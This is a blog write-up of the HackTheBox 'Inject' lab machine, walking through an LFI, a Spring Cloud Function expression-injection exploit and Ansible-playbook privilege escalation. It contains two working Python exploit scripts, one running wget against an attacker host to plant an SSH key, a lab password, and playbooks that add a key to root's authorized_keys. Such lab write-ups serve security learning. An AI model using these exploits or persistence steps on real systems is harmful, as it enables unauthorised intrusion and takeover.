---
layout:     post
title:      "HackTheBox - Inject"
subtitle:   "Write-Up"
date:       2023-07-08
author:     "D4mianwayne"
tags:    ["ansible-playbooks, cronjob, easy, java, seasonal, spring4shell"]
img:  "/img/htb.png"
categories: ["HackTheBox"]
layout: "simple"

---



Writeup for HackTheBox's Inject machine.

<!-- more -->

We have an upload functionality in the web app and it accepts PNG files, although there are some bypasses but they didn’t lead anywhere.

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_1.png)

Once you upload a valid PNG/Image file, you can view it by going to `show_image` and the filename is specified by the `img` parameter

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_2.png)

It is vulnerable to LFI vulnerability, we can access any arbitrary file with the known location.

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_3.png)

After some hefty enumeration, we can see the absolute path for the webapp by checking the `webapp.service` this filename was retrieved from the `/opt/automation/tasks/playbook_1.yml` during initial enumeration, as giving the a directory location will list out the sub-directories and it’s associated files:

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_4.png)

Checking the service files, we can get the location of the jar file of the webserver.

```asm
[Unit]
Description=Spring WEb APP
After=syslog.target

[Service]
User=frank
Group=frank
ExecStart=/usr/bin/java -Ddebug -jar /var/www/WebApp/target/spring-webapp.jar
Restart=always
StandardOutput=syslog
StandardError=syslog

[Install]
WantedBy=multi-user.target
```

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_5.png)

With the retrieved information, we can get the Spring version by checking `pom.xml` and it is vulnerable with https://github.com/me2nuk/CVE-2022-22963 

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_6.png)

I modified the original script to pass the arguments for better work:

```python
import requests
import sys
import threading
import urllib3
urllib3.disable_warnings()

def scan(txt,cmd):

    payload=f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    f = open(txt)
    urllist=f.readlines()

    for  url  in  urllist :
        url = url.strip('\n')
        all = url + path
        try:
            req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
            code =req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'

            if code == 500 and rsp in text:
                print ( f'[+] { url } is vulnerable' )
                poc_file = open('vulnerable.txt', 'a+')
                poc_file.write(url + '\n')
                poc_file.close()
            else:
                print ( f'[-] { url } not vulnerable' )

        except requests.exceptions.RequestException:
            print ( f'[-] { url } detection timed out' )
            continue
        except:
            print ( f'[-] { url } error' )
            continue

if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        cmd2 = sys.argv[2]
        t = threading . Thread ( target = scan ( cmd1 , cmd2 ) ) 
        t.start()
    except:
        print ( 'Usage:' )
        print('python poc.py url.txt')
        pass
```

For confirmation, doing a ping on my host from the Inject machine, using `tcpdump` we received ICMP requests.

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_7.png)

Again, modifying the script to add the public key to the `frank` user so we can SSH into the machine.

```python
import requests
import sys
import threading
import urllib3
urllib3.disable_warnings()

def scan(txt,cmd):

    payload=f'T(java.lang.Runtime).getRuntime().exec("wget http://10.10.14.19/authorized_keys -O /home/frank/.ssh/authorized_keys")'

    data ='test'
    headers = {
        'spring.cloud.function.routing-expression':payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    path = '/functionRouter'
    f = open(txt)
    urllist=f.readlines()

    for  url  in  urllist :
        url = url.strip('\n')
        all = url + path
        try:
            req=requests.post(url=all,headers=headers,data=data,verify=False,timeout=3)
            code =req.status_code
            text = req.text
            rsp = '"error":"Internal Server Error"'

            if code == 500 and rsp in text:
                print ( f'[+] { url } is vulnerable' )
                poc_file = open('vulnerable.txt', 'a+')
                poc_file.write(url + '\n')
                poc_file.close()
            else:
                print ( f'[-] { url } not vulnerable' )

        except requests.exceptions.RequestException:
            print ( f'[-] { url } detection timed out' )
            continue
        except:
            print ( f'[-] { url } error' )
            continue

if __name__ == '__main__' :
    try:
        cmd1 =sys.argv[1]
        cmd2 = sys.argv[2]
        t = threading . Thread ( target = scan ( cmd1 , cmd2 ) ) 
        t.start()
    except:
        print ( 'Usage:' )
        print('python poc.py url.txt')
        pass
```

Confirming the key has been added to the `authorized_keys` file for the `frank` user via LFI:

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_8.png)

Successfully doing SSH into the machine as `frank` user:

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_9.png)

From the LFI itself, we were able to retrieve the file `/home/frank/.m2/settings.xml` and `paul` user password,

```xml
-bash-5.0$ cat .m2/settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Using the password, we can change to user `paul` 

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_10.png)

Further looking into the writable folder and files, we can see that `/opt/automation/tasks` is writable by `staff` group member and `paul` is a member of that group.

```asm
bash-5.0$ find / -writable 2>/dev/null | grep -v proc

[..snip..]

/tmp/.XIM-unix
/tmp/.font-unix
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/opt/automation/tasks
/etc/systemd/system/nginx.service
/etc/systemd/system/sysstat.service
/var/tmp
/var/crash
/var/local
/var/lock
/home/phil
/home/phil/.bashrc
/home/phil/.bash_history
/home/phil/.cache
/home/phil/.cache/motd.legal-displayed
/home/phil/.profile
/home/phil/.viminfo
/home/phil/.vim
/home/phil/.vim/.netrwhist
/home/frank/.bash_history
/usr/lib/systemd/system/screen-cleanup.service
/usr/lib/systemd/system/lvm2.service
/usr/lib/systemd/system/rcS.service
/usr/lib/systemd/system/x11-common.service
/usr/lib/systemd/system/cryptdisks.service
/usr/lib/systemd/system/multipath-tools-boot.service
/usr/lib/systemd/system/hwclock.service
/usr/lib/systemd/system/rc.service
/usr/lib/systemd/system/sudo.service
/usr/lib/systemd/system/cryptdisks-early.service
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/share/fonts
```

That directory had an ansible playbook file for automating tasks

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_11.png)

From the enumeration, we were able to anticipate that any tasks created in this directory will be executed, hence to replicate it, I created two tasks,

This is for creating an `.ssh` directory is `root` home directory

```xml
---
- name: Create directory in root folder
  hosts: localhost
  become: yes

  tasks:
    - name: Create directory
      file:
        path: /root/.ssh
        state: directory
        mode: '0755'
      register: create_result

    - name: Display create result
      debug:
        var: create_result
```

Another is to add the same public key we used for `frank` user to `root` user’s `authorized_keys` 

```xml
- name: Copy id_rsa file to /root/.ssh/
  hosts: localhost
  become: yes

  tasks:
    - name: Copy id_rsa file
      copy:
        src: /home/frank/.ssh/authorized_keys
        dest: /root/.ssh/authorized_keys
        mode: '0600'
      register: copy_result

    - name: Display copy result
      debug:
        var: copy_result
```

Doing so, we were able to login to the  target as `root`

![](/img/Inject_-_Seasonal_9e3607466f6a4ad49fada783b796669f/Untitled_12.png)


